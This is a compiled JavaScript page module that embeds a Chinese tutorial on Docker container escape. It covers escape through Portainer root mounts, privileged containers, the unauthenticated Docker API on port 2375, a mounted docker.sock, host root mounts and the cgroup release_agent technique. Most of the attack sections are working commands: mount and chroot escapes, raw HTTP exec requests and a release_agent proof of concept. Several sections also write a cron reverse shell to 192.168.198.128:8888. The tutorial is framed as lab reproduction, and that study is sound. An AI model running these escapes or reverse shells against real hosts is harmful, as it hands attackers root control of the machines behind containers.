import{ah as s,ai as a,an as i,am as t}from"./app-CDlmAbgn.js";const n="/assets/v2-f93a64c36440021de02448c3d67e97c2_720w-SH6LfIO5.webp",r="/assets/v2-3d846f9995f97fd52b62631c8d784292_720w-Dg4zSLUB.webp",o="/assets/v2-9dfd492197b9fabfc899b63ad4cf05f0_720w-CzFbKNxm.png",c="/assets/v2-1644cf329126b3577be751ff6a64141e_720w-DJHo2B10.webp",p="/assets/v2-fcfb220a4f2770fa1dc10eae496754eb_720w-a9-Xk1Is.png",d="/assets/v2-60dfa850b4ceffb509388cd2f1d0e3a1_720w-mE06D9Tn.webp",l="/assets/v2-49fb2aea615c459697a35e801c3b06af_720w-DTKe2OOR.png",h="/assets/v2-9a37cf12ad1de9a50b3e025a01f029ee_720w-CAFXaP9Q.png",g="/assets/v2-30c70213aeefe65781d08e1f6437834f_720w-5_LrF7ys.png",m="/assets/v2-b8cf765fa83b56b5ed737699ac46bbbf_720w-ClCUL-kV.png",k="/assets/v2-49c324418ebd58b1f7f3dc9ccba292fb_720w-DU1nHxKL.png",u="/assets/v2-3496a2bc1e7b042ac5297e0a5392c2d8_720w-B2yjwwmq.png",b="/assets/image-20231008150906969-60K8eUkm.png",v="/assets/image-20231008150916195-D0db5kAZ.png",f="/assets/image-20231008150936304-DhmscOWi.png",_="/assets/v2-e5453e0367177cd23a9f28acef0f0dca_720w-Dit-5EHH.webp",A="/assets/v2-4b4e4a809693c2dad50d2204fc7ee253_720w-rZajL0Ex.png",y="/assets/v2-c236cf8292744b21a47aa6537c410620_720w-CewdBumT.png",x="/assets/v2-3eba16d5d2dda5570840d7d37c082efc_720w-CAU8baX6.png",q="/assets/image-20231008151105176-BB1K0tzw.png",F="/assets/image-20231008151112952-D7Oek_l1.png",B="/assets/image-20231008151120168-BGz-J0cz.png",D="/assets/image-20231008151137407-BHmJoT7_.png",w="/assets/image-20231008151145940-AL7kXaRQ.png",C="/assets/image-20231008151155099-tadnYJbc.png",P="/assets/image-20231008151203454-D7AAuL1x.png",S="/assets/v2-df19c00ef140ee6ab3301fddf39861e6_720w-BA-YZ_Fp.webp",E="/assets/v2-c5faafb867b7b24d6f6adf31c8d30176_720w-BlqAF0QG.png",z="/assets/v2-5a893d1784aecf0f38c8220bc9915b35_720w-B33u0DEu.png",H="/assets/v2-7ccf8e29ac0769675c7c1a04b5b72f29_720w-DXpxufS6.png",L="/assets/v2-5f4e02373b6f82a4c89d63618033bab0_720w-8ddnqfYA.png",T="/assets/v2-80d6498a6e3afeea5ec32644caab98ca_720w-C_xki13l.png",O="/assets/v2-7684d1e7baf866f6eb662ff975b01d51_720w-kLnNJb9n.png",j="/assets/image-20231008151257015-BoUPveKZ.png",N="/assets/image-20231008151305785-BHdIaFDF.png",V="/assets/image-20231008151315859-xY3fnPgk.png",X="/assets/image-20231008151325115-eKkgebP9.png",K="/assets/image-20231008151335795-Bd5XcK6K.png",M="/assets/image-20231008151350156-Brwzia6p.png",I="/assets/image-20231008151550551-DWI7dLcX.png",G="/assets/image-20231008151559045-DF5dubHK.png",U="/assets/image-20231008151609076-WA9XLqm_.png",Y="/assets/image-20231008151619854-CDPY_SLx.png",Z="/assets/image-20231008151628250-qvq6rgn1.png",$="/assets/image-20231008151637425-DVW8MnA_.png",J="/assets/image-20231008151648920-baXHmWdU.png",R="/assets/image-20231008151657142-BpNpPd0s.png",W="/assets/image-20231008151704945-BuSX6j18.png",Q="/assets/image-20231008151713095-DV0NFNA8.png",ee="/assets/image-20231008151721117-CLoAqcPB.png",se="/assets/image-20231008151732401-kGoxNb-U.png",ae="/assets/image-20231008151740181-Czl6ga3i.png",ie="/assets/v2-29242efcee38fd28b492d991bcdcccab_720w-DhyNqVtp.png",te={};function ne(re,e){return t(),a("div",null,e[0]||(e[0]=[i('<h1 id="docker逃逸漏洞案例" tabindex="-1"><a class="header-anchor" href="#docker逃逸漏洞案例"><span>Docker逃逸漏洞案例</span></a></h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/588513910" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/588513910</a></p></blockquote><h2 id="什么是docker" tabindex="-1"><a class="header-anchor" href="#什么是docker"><span><strong>什么是Docker</strong></span></a></h2><p>Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他的基础应用平台。</p><h3 id="判断当前是否为docker环境" tabindex="-1"><a class="header-anchor" href="#判断当前是否为docker环境"><span><strong>判断当前是否为docker环境</strong></span></a></h3><p>首先在我们拿到一个主机权限之后，需要判断该权限所处环境是不是docker，可以使用下面两条命令</p><ol><li>是否存在.dockerenv文件，若该文件存在则为docker环境，若不存在该文件则当前环境非docker环境<code>ls -alh /.dockerenv</code></li></ol><p><img src="'+n+'" alt="img"></p><p><img src="'+r+'" alt="img"></p><ol start="2"><li>查询系统进程的cgroup信息，docker环境中的cgroup文件普遍存在docker字段，而真实环境中不存在docker字段<code>cat /proc/1/cgroup</code></li></ol><p><img src="'+o+'" alt="img"></p><p><img src="'+c+'" alt="img"></p><h2 id="docker逃逸漏洞案例-1" tabindex="-1"><a class="header-anchor" href="#docker逃逸漏洞案例-1"><span><strong>Docker逃逸漏洞案例</strong></span></a></h2><p>Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行EXP或POC，就可以返回一个宿主机的高权限shell，并拿到宿主机的root权限，可以直接操作宿主机文件，从容器中逃了出来，因此我们将其称为Docker逃逸漏洞案例漏洞。</p><h2 id="portainer后台挂载宿主机根目录进行逃逸" tabindex="-1"><a class="header-anchor" href="#portainer后台挂载宿主机根目录进行逃逸"><span><strong>Portainer后台挂载宿主机根目录进行逃逸</strong></span></a></h2><p>Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建、管理和维护Docker环境，而且完全免费，基于容器化的安装方式，方便高效部署。 需要注意的是后台没有默认账号密码，当第一次登录系统时会提示设置新密码，在实战中可以尝试爆破。</p><h3 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建"><span><strong>环境搭建</strong></span></a></h3><p>在安装了docker的物理机中运行该命令<code>docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce</code></p><p><img src="'+p+'" alt="img"></p><p>部署成功后访问宿主机的9000端口，设置用户名与密码</p><p><img src="'+d+'" alt="img"></p><p><img src="'+l+'" alt="img"></p><h3 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span><strong>漏洞利用</strong></span></a></h3><p>进入容器中，添加一个新容器</p><p><img src="'+h+'" alt="img"></p><p>进入到portainer后台界面</p><p><img src="'+g+'" alt="img"></p><p>这里给该容器命名并选择一个镜像</p><p><img src="'+m+'" alt="img"></p><p>下滑到Advanced container settings将console设置为interactive &amp; tty</p><p><img src="'+k+'" alt="img"></p><p>然后到Volumes中将根目录挂载到容器中</p><p><img src="'+u+'" alt="img"></p><p><img src="'+b+'" alt="image-20231008150906969"></p><p>然后点击部署即可</p><p><img src="'+v+'" alt="image-20231008150916195"></p><p>部署成功后回到容器中，进入到该容器终端内 进入到终端后，输入如下命令<code>ls /tide/</code><code>chroot /tide/ bash</code></p><p><img src="'+f+'" alt="image-20231008150936304"></p><p>如此成功逃逸到宿主机中，也可直接反弹shell<code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root</code></p><p><img src="'+_+'" alt="img"></p><h2 id="privileged特权模式启动容器" tabindex="-1"><a class="header-anchor" href="#privileged特权模式启动容器"><span><strong>privileged特权模式启动容器</strong></span></a></h2><p>特权模式逃逸是一种最简单有效的逃逸方法，该漏洞的原理是宿主机使用root用户或使用sudo命令启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载到容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划等逃逸到宿主机。</p><h3 id="特权模式与非特权模式的区别" tabindex="-1"><a class="header-anchor" href="#特权模式与非特权模式的区别"><span><strong>特权模式与非特权模式的区别</strong></span></a></h3><ul><li><code>Linux Capabilities</code></li></ul><ol><li>普通模式下容器内进程只可以使用有限的一些Linux Capabilities</li><li>特权模式下的容器内进程可以使用所有的Linux Capabilities</li></ol><ul><li><p>Linux敏感目录 1. 普通模式下，部分内核模块路径比如/proc下的一些目录需要阻止写入、有些又需要允许读写，这些文件目录将会以tmpfs文件系统的方式挂载到容器中，以实现目录mask的需求 2. 特权模式下，这些目录将不再以tmpfs文件系统的方式挂载</p></li><li><p>任何内核文件都是可读写 1. 普通模式下，部分内核文件系统（sysfs、procfs）会被只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核 2. 特权模式下，内核文件系统将不再以只读的方式被挂载</p></li><li><p>APPArmor和Seccomp</p></li></ul><ol><li>普通模式下，可以通过配置APPArmor或Seccomp相关安全选项</li><li>特权模式下，这些AppArmor或Seccomp相关配置将不再生效</li></ol><ul><li>cgroup读写</li></ul><ol><li>默认情况下，只能以只读模式操作cgroup</li><li>特权模式下，将可以对cgroup进行读写操作</li></ol><ul><li>/dev</li></ul><ol><li>普通模式下，容器内/dev目录下看不到节点/dev目录下特有的devices</li><li>特权模式下，容器内的/dev目录会包含这些来自节点/dev目录下的那些内容</li></ol><ul><li>SELinux</li></ul><ol><li><p>特权模式下，SELinux相关的安全加固配置将被禁用</p></li><li><p>普通模式下也可以通过对应的安全选项来禁用SELinux特性</p></li></ol><h3 id="判断方法" tabindex="-1"><a class="header-anchor" href="#判断方法"><span><strong>判断方法</strong></span></a></h3><p>在容器中可以使用该命令检测当前容器是否以特权模式启动<code>cat /proc/self/status | grep Cap</code>如果是特权模式启动的话，CapEff对应的掩码值在centos中为 0000001fffffffff ，在ubuntu中为0000003fffffffff，如下图</p><p><img src="'+A+'" alt="img"></p><p><img src="'+y+'" alt="img"></p><h3 id="环境搭建-1" tabindex="-1"><a class="header-anchor" href="#环境搭建-1"><span><strong>环境搭建</strong></span></a></h3><p>在安装有docker机器的主机上直接运行该命令，启动该容器即可。<code>docker run -it --privileged ubuntu:18.04</code></p><p><img src="'+x+'" alt="img"></p><h3 id="漏洞利用-1" tabindex="-1"><a class="header-anchor" href="#漏洞利用-1"><span><strong>漏洞利用</strong></span></a></h3><p>首先我们为了区别宿主机与docker容器的区别，我们先在宿主机中新建一个文件，作为标识区别</p><p><img src="'+q+'" alt="image-20231008151105176"></p><p>在启动后我们会进入到docker容器的bash中，在这里我们查看当前主机的docker是否为特权模式启动。<code>cat /proc/self/status | grep Cap</code></p><p><img src="'+F+'" alt="image-20231008151112952"></p><p>我们可以将宿主机目录挂载到该docker容器中，首先查看当前磁盘分区情况，获得宿主机分区<code>fdisk -l</code></p><p><img src="'+B+'" alt="image-20231008151120168"></p><p>这里我们根据分区大小得知到宿主机的磁盘为/dev/dm-0，这时可以直接挂载宿主机的磁盘</p><p><code>mkdir tide</code><code>mount /dev/dm-0 /tide/</code><code>chroot /tide/</code></p><p><img src="'+D+'" alt="image-20231008151137407"></p><p>这时我们会进入一个bash会话，在这里可以查看宿主机的/etc/passwd等敏感文件</p><p><img src="'+w+'" alt="image-20231008151145940"></p><p>这时去查看刚刚我们在宿主机根目录中创建的flag.txt文件，看其是否存在，就能判断出我们当前是否已经成功跳出docker容器</p><p><img src="'+C+'" alt="image-20231008151155099"></p><p>这里可以看到我们现在已经成功跳出了docker容器，获得了宿主机的权限，可以使用计划任务反弹shell<code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root</code></p><p><img src="'+P+'" alt="image-20231008151203454"></p><h2 id="docker-api-未授权访问" tabindex="-1"><a class="header-anchor" href="#docker-api-未授权访问"><span><strong>Docker API 未授权访问</strong></span></a></h2><p>该漏洞起因是因为使用Docker Swarm时，管理的docker 节点上便会开放一个TCP端口2375/2376，绑定在0.0.0.0上，如果没有做限制访问来源的话，攻击者可以通过Doker未授权来控制服务器。</p><h3 id="环境搭建-2" tabindex="-1"><a class="header-anchor" href="#环境搭建-2"><span><strong>环境搭建</strong></span></a></h3><p>在vulhub中存在该漏洞复现环境，部署命令如下：<code>cd docker/unauthorized-rce/</code><code>docker-compose build</code><code>docker-compose up -d</code><code>docker-compose ps</code></p><p><img src="'+S+'" alt="img"></p><p>也可以在真实Docker中部署该环境，部署步骤如下：<code>#下载环境</code><code>curl -o /etc/yum.repos.d/Centos-7.repo http://mirrors.aliyun.com/repo/Centos-7.repo</code><code>curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code><code>yum clean all &amp;&amp; yum makecache</code></p><p><img src="'+E+'" alt="img"></p><p>安装指定版本docker<code>yum install -y docker-ce-18.09.9</code></p><p><img src="'+z+`" alt="img"></p><p>配置加速源</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/docker/daemon.json</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  &quot;registry-mirrors&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://docker.zhai.cm&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://a.ussh.net&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://hub.littlediary.cn&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://hub.rat.dev&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://atomhub.openatom.cn&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://docker.m.daocloud.io&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://docker.1ms.run&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://dytt.online&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://func.ink&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://lispy.org&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://docker.xiaogenban1993.com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://docker.mybacc.com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://docker.yomansunter.com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;https://dockerhub.websoft9.com&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+H+'" alt="img"></p><p>设置开机自启：<code>systemctl enable docker</code><code>systemctl daemon-reload</code></p><p><img src="'+L+'" alt="img"></p><p>启动contianerd服务：<code>containerd #启动</code><code>systemctl status containerd # 查看服务状态</code></p><p><img src="'+T+'" alt="img"></p><p>开启2375端口，提供外部访问：<code>vim /usr/lib/systemd/system/docker.service</code><code>ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H fd:// --containerd=/run/containerd/containerd.sock</code></p><p><img src="'+O+'" alt="img"></p><p>改完之后需要重启：<code>systemctl daemon-reload</code><code>systemctl restart docker</code></p><p>然后我这里还需要在防火墙中将2375端口放行，命令如下：<code>systemctl start firewalld</code><code>firewall-cmd --zone=public --add-port=&quot;2375&quot;/tcp --permanent</code><code>firewall-cmd --permanent --query-port=&quot;2375&quot;/tcp</code><code>systemctl restart firewalld</code></p><p>接下来我们访问该ip的2375端口即可，当我们访问时会返回 404 page not found。这是 Docker RemoteAPI，可以执行docker命令。</p><p><img src="'+j+'" alt="image-20231008151257015"></p><p>这里如果我们继续访问<a href="http://192.168.198.129:2375/version" target="_blank" rel="noopener noreferrer">http://192.168.198.129:2375/version</a>，会返回docker的版本信息，这样证明该漏洞存在。</p><p><img src="'+N+'" alt="image-20231008151305785"></p><p>比如访问 <a href="http://192.168.198.129:2375/containers/json" target="_blank" rel="noopener noreferrer">http://192.168.198.129:2375/containers/json</a> 会返回docker信息，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。</p><p><img src="'+V+'" alt="image-20231008151315859"></p><h3 id="漏洞利用-2" tabindex="-1"><a class="header-anchor" href="#漏洞利用-2"><span><strong>漏洞利用</strong></span></a></h3><h3 id="利用方法1-命令执行" tabindex="-1"><a class="header-anchor" href="#利用方法1-命令执行"><span><strong>利用方法1 命令执行</strong></span></a></h3><p>访问 <a href="http://192.168.198.129:2375/containers/json" target="_blank" rel="noopener noreferrer">http://192.168.198.129:2375/containers/json</a> 获得刚刚返回的exec_id的参数，构造如下数据包：</p><p><img src="'+X+'" alt="image-20231008151325115"></p><p><code>POST /containers/7badb971f85814c718dcc4efdd34fead171ebdbb099bc5252f02785374e24b0f/exec HTTP/1.1</code><code>Host: 192.168.198.138:2375</code><code>Content-Type: application/json</code><code>Content-Length: 168</code><code>{</code><code>&quot;AttachStdin&quot;:true,</code><code>&quot;AttachStdout&quot;:true,</code><code>&quot;AttachStderr&quot;:true,</code><code>&quot;Cmd&quot;:[</code><code>&quot;cat&quot;,&quot;/etc/passwd&quot;</code><code>],</code><code>&quot;DetachKeys&quot;:&quot;ctrl-p,ctrl-q&quot;,</code><code>&quot;Privileged&quot;:true,</code><code>&quot;Tty&quot;:true</code><code>}</code>注意其中cmd的字段，这就是我们要执行的命令，发送后会得到第二个id，这里需构造一个exec_start数据包，内容如下。</p><p><img src="'+K+'" alt="image-20231008151335795"></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>POST /exec/962fee39c29a2c9d5ea984b55673a7823aa06b6187eaf4be279f25af6cecad1f/start HTTP/1.1`</span></span>\n<span class="line"><span>`Host: 192.168.198.138:2375`</span></span>\n<span class="line"><span>`Content-Type: application/json`</span></span>\n<span class="line"><span>`Content-Length: 36`</span></span>\n<span class="line"><span>`{`</span></span>\n<span class="line"><span>`&quot;Detach&quot;:false,`</span></span>\n<span class="line"><span>`&quot;Tty&quot;:false`</span></span>\n<span class="line"><span>`}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="'+M+`" alt="image-20231008151350156"></p><p>然后发送就会得到结果，至此成功获得该docker主机的rce权限，但无法逃逸到宿主机中。</p><h3 id="利用方法2-远程连接-新建特权容器-逃逸到宿主机中" tabindex="-1"><a class="header-anchor" href="#利用方法2-远程连接-新建特权容器-逃逸到宿主机中"><span><strong>利用方法2 远程连接，新建特权容器，逃逸到宿主机中</strong></span></a></h3><p>因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在我们的主机上通过远程方式连接doker ，然后以特权模式启动一个docker容器，从而达到逃逸到宿主机的情况</p><p><code>docker -H tcp://192.168.198.138:2375 ps</code><code>docker -H docker -H tcp://192.168.241.142:2375 run -it --privileged alpine bin/sh</code></p><p>进入容器后，使用fdisk -l命令查看磁盘文件<code>fdisk -l</code></p><p>分区大小得知到宿主机的磁盘为/dev/dm-0，这里可以使用上面我们刚刚特权模式逃逸的命令将该磁盘挂载到目录中<code>mkdir /tide/</code><code>mount /dev/dm-0 /tide/</code><code>chroot /tide/</code></p><p>成功逃逸到宿主机</p><h2 id="挂载docker-sock" tabindex="-1"><a class="header-anchor" href="#挂载docker-sock"><span><strong>挂载Docker.sock</strong></span></a></h2><p>Docker架构相当于C/S架构，docker.sock就是docker中套docker，docker的client和server的通信模式参考:<a href="https://link.zhihu.com/?target=https%3A//www.jb51.net/article/99019.htm" target="_blank" rel="noopener noreferrer">https://www.jb51.net/article/99019.htm</a> 利用docker.sock逃逸的前提条件</p><ol start="3"><li><p>攻击者获得了docker容器的访问权限</p></li><li><p>容器已安装/var/run/docker.sock</p></li></ol><h3 id="环境搭建-3" tabindex="-1"><a class="header-anchor" href="#环境搭建-3"><span><strong>环境搭建</strong></span></a></h3><p>创建Docker<code>docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04</code></p><p>随后在docker容器中安装docker<code># ubuntu 18.04安装docker</code><code>apt-get update</code><code># 安装依赖包</code><code>apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code><code># 添加 Docker 的官方 GPG 密钥</code><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -</code><code># 验证当前是否拥有带有指纹的密钥</code><code>apt-key fingerprint 0EBFCD88</code><code># 设置稳定版仓库</code><code>add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</code><code># 更新</code><code>apt-get update</code><code># 安装最新的Docker-ce</code><code>apt-get install docker-ce</code><code># 启动</code><code>systemctl enable docker</code><code>systemctl start docker</code></p><p>这时安装完成后我们就可以使用docker ps来看到宿主机上的容器了。</p><h3 id="漏洞利用-3" tabindex="-1"><a class="header-anchor" href="#漏洞利用-3"><span><strong>漏洞利用</strong></span></a></h3><p>将宿主机的根目录挂载到容器中<code>docker run -it -v /:/tide ubuntu:18.04 /bin/bash</code><code>chroot tide</code></p><p>这时可以看到返回出一个bash会话，这里我们就可以看到我们之前在宿主机中创建的flag.txt了</p><p>这里也可以使用计划任务反弹shell<code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root</code></p><h2 id="挂载宿主机根目录" tabindex="-1"><a class="header-anchor" href="#挂载宿主机根目录"><span><strong>挂载宿主机根目录</strong></span></a></h2><p>如果在docker启动的时候挂载了宿主机的根目录，就可以通过chroot获取宿主机的权限<code>docker run -it -v /:/tide/ ubuntu:18.04</code><code>chroot /tide/</code></p><p>相同也可以通过计划任务反弹shell<code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root</code></p><h3 id="cgroup执行宿主机系统命令" tabindex="-1"><a class="header-anchor" href="#cgroup执行宿主机系统命令"><span><strong>Cgroup执行宿主机系统命令</strong></span></a></h3><p>docker使用cgroup进行资源限制，当cgroup中最后一个任务结束且notify_on_release开启，release_agent可执行事先提供的命令，因此可以利用这个特性来实现容器的逃逸。</p><h3 id="漏洞利用条件" tabindex="-1"><a class="header-anchor" href="#漏洞利用条件"><span><strong>漏洞利用条件</strong></span></a></h3><p>1.以root用户身份在容器内运行</p><p>2.使用SYS_ADMINLinux功能运行</p><p>3.缺少APPArmor配置文件，否则将允许mountsyscall</p><p>4.cgroup V1虚拟文件系统必须以读写方式安装在容器内</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#### 环境搭建</span></span>
<span class="line"><span></span></span>
<span class="line"><span>docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+I+`" alt="image-20231008151550551"></p><h3 id="漏洞利用-4" tabindex="-1"><a class="header-anchor" href="#漏洞利用-4"><span><strong>漏洞利用</strong></span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x </span></span>
<span class="line"><span>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x </span></span>
<span class="line"><span># 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent </span></span>
<span class="line"><span>#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent </span></span>
<span class="line"><span>echo 1 &gt; /tmp/cgrp/x/notify_on_release </span></span>
<span class="line"><span>host_path=\`sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab\` </span></span>
<span class="line"><span>echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent </span></span>
<span class="line"><span># 写入自定义命令 </span></span>
<span class="line"><span>echo &#39;#!/bin/sh&#39; &gt; /cmd </span></span>
<span class="line"><span># 结果在当前目录的output文件中 </span></span>
<span class="line"><span>echo &quot;cat /flag.txt &gt; $host_path/output&quot; &gt;&gt; /cmd </span></span>
<span class="line"><span>chmod a+x /cmd </span></span>
<span class="line"><span># 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果 </span></span>
<span class="line"><span>sh -c &quot;echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+G+`" alt="image-20231008151559045"></p><p>如上图所示，成功获取到宿主机根目录的flag.txt的内容，同理，我们将上面poc中的echo中的命令修改为反弹shell的命令，即可进行反弹shell，获得宿主机的权限。</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo &quot;echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root&quot;&gt;&gt; /cmd </span></span>
<span class="line"><span>chmod a+x /cmd </span></span>
